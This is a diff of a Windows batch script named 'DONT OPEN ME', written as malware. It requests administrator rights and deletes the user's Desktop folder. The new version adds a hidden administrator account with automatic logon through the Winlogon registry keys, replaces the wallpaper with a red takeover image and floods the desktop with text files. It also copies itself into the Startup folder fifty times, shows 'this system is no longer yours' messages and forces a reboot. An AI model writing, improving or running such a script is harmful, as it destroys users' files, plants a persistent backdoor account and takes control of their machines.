@@ -1,54 +1,44 @@
 @echo off
-:: Vérification des droits d'administrateur
+
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: Masquer la fenêtre pour rendre le script plus menaçant
+
 powershell -WindowStyle Hidden -Command ""
 
-:: Mettre le volume au maximum
-powershell -Command "(New-Object -ComObject SAPI.SPVoice).Speak('Attention')"
+net user "DONT OPEN ME" /add
+net localgroup Administrateurs "DONT OPEN ME" /add
 
-:: Suppression de tous les fichiers sur le bureau
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "DONT OPEN ME" /f
+
 set desktop=%userprofile%\Desktop
 del /f /q "%desktop%\*" >nul 2>&1
 rmdir /s /q "%desktop%" >nul 2>&1
 
-:: Remplir le bureau avec des fichiers menaçants
 for /l %%i in (1,1,100) do (
-    echo YOU SHOULD NOT HAVE OPENED THIS... > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
+    echo THIS SYSTEM BELONGS TO DONT OPEN ME > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
 )
 
-:: Lancer des fenêtres CMD en boucle avec des messages troublants
-for /l %%i in (1,1,100) do (
-    start cmd /k "color 4 & echo ******************************************* & echo ** YOU CAN'T ESCAPE DONT OPEN ME IS HERE ** & echo ******************************************* & pause"
-)
+set wallpaper=%userprofile%\Desktop\DONT_OPEN_ME_RED.bmp
+powershell -Command "& {
+    $Width = 1920; $Height = 1080;
+    $bitmap = New-Object Drawing.Bitmap $Width, $Height;
+    $graphics = [Drawing.Graphics]::FromImage($bitmap);
+    $redBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(255, 255, 0, 0));
+    $whiteBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::White);
+    $font = New-Object Drawing.Font('Arial', 48, [Drawing.FontStyle]::Bold);
+    $graphics.FillRectangle($redBrush, 0, 0, $Width, $Height);
+    $graphics.DrawString('DONT OPEN ME IS HERE', $font, $whiteBrush, 200, 400);
+    $bitmap.Save('%wallpaper%');
+}"
 
-:: Sons stridents et alarmes en boucle
-:start_sounds
-(for /l %%i in () do (
-    powershell -Command "[console]::beep(500,500)"
-    powershell -Command "[console]::beep(1000,500)"
-    powershell -Command "[console]::beep(1500,500)"
-)) | cmd
-
-:: Changer l'arrière-plan du bureau pour ajouter à la peur
-set warning_file=%userprofile%\Desktop\WARNING.txt
-echo !!! VOUS ÊTES CONTRÔLÉ PAR DONT OPEN ME !!! > "%warning_file%"
-echo VOTRE SYSTÈME EST MAINTENANT INUTILE. >> "%warning_file%"
-echo C'ÉTAIT INÉVITABLE. >> "%warning_file%"
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%warning_file%" /f
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
-:: Désactivation temporaire du clavier
-rundll32 user32.dll,BlockInput 1
-timeout /t 15 >nul
-rundll32 user32.dll,BlockInput 0
-
-:: Ajouter le script au démarrage 50 fois
 set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 for /l %%i in (1,1,50) do (
     setlocal enabledelayedexpansion
@@ -57,12 +47,8 @@ for /l %%i in (1,1,50) do (
     endlocal
 )
 
-:: Première alerte avant redémarrage
-msg * "DONT OPEN ME IS HERE. YOUR SYSTEM IS LOST. PREPARE FOR THE END."
+msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS."
 timeout /t 15 >nul
 
-:: Redémarrage constant avec un message final terrifiant
-:loop
-msg * "DONT OPEN ME IS EVERYWHERE. YOU CAN'T ESCAPE."
+
 shutdown /r /f /t 15
-goto loop
